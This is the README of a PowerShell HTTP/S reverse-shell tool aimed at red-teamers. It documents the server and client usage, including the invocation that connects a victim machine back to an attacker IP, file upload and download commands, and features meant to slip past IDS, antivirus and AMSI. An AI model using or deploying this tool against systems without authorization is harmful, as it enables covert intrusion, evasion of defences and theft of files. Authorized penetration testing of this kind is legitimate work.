# Powershell HTTP/S Reverse Shell

## Description
HTTP-revshell is a tool focused on redteam exercises and pentesters. This tool provides a reverse connection through the http/s protocol. It use a covert channel to gain control over the victim machine through web requests and thus evade solutions such as IDS, IPS and AV.

<p align="center"><img width=400 alt="HTTP-revshell" src="https://raw.githubusercontent.com/3v4Si0N/HTTP-revshell/master/images/logo.png"></p>

## Help server.py (unisession server)
Server usage:
```
usage: server.py [-h] [--ssl] [--autocomplete] host port

Process some integers.

positional arguments:
  host            Listen Host
  port            Listen Port

optional arguments:
  -h, --help      show this help message and exit
  --ssl           Send traffic over ssl
  --autocomplete  Autocomplete powershell functions
```

## Help Invoke-WebRev.ps1 (client)
Client usage:
```
Import-Module .\Invoke-WebRev.ps1
Invoke-WebRev -ip IP -port PORT [-ssl]
```

## Installation
```shell
git clone https://github.com/3v4Si0N/HTTP-revshell.git
cd HTTP-revshell/
pip3 install -r requirements.txt
```

## Quick start server-multisession.py (multisession server)

```
This server allows multiple connection of clients.
There is a menu with three basic commands: sessions, interact and exit
     - sessions --> show currently active sessions
     - interact --> interacts with a session (Example: interact <session_id>)
     - exit --> close the application
```
**IMPORTANT**: To change the session press *CTRL+d* to exit the current session without closing it.

## Features
 - SSL
 - Proxy Aware
 - Upload Function
 - Download Function
 - Error Control
 - AMSI bypass
 - Multiple sessions [only server-multisession.py]
 - Autocomplete PowerShell functions (optional) [only server.py]
    
## Extra functions usage
### Upload
 - upload /src/path/file C:\dest\path\file
### Download
 - download C:\src\path\file /dst/path/file

## Credits
 - [JoelGMSec] for his awesome Revshell-Generator.ps1. Twitter: [@JoelGMSec]
 - [dev2null] for report the first bug. Twitter: [@dev2null]

## Disclaimer & License
This script is licensed under LGPLv3+. Direct link to [License](https://raw.githubusercontent.com/3v4Si0N/HTTP-revshell/master/LICENSE).

HTTP-revshell should be used for authorized penetration testing and/or nonprofit educational purposes only. 
Any misuse of this software will not be the responsibility of the author or of any other collaborator. 
Use it at your own servers and/or with the server owner's permission.
